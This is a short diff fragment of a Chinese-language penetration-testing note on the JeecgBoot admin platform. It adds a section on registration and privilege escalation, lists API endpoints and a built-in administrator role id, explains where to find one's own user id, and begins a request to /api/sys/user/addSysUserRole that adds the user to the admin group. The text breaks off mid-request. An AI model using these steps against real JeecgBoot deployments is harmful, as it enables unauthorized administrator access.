@@ -145,6 +145,10 @@ Content-Type: application/json
 }
 ```
 
+
+^
+## **注册和越权**
+
 用户注册，大概率可以水平越权和权限提升。
 ```
 /api/jeecg-system/sms
@@ -201,6 +205,7 @@ f6817f48af4fb3af11b9e8bf182f618b
 /api/sys/user/userRoleList?roleId=f6817f48af4fb3af11b9e8bf182f618b
 ```
 加入自己的用户id到管理员组
+查询自己的用户id在登录时有，或者/api/sys/user/list，或看看jwt里面有没有。
 ```
 POST /api/sys/user/addSysUserRole HTTP/1.1
 Host: demo.te
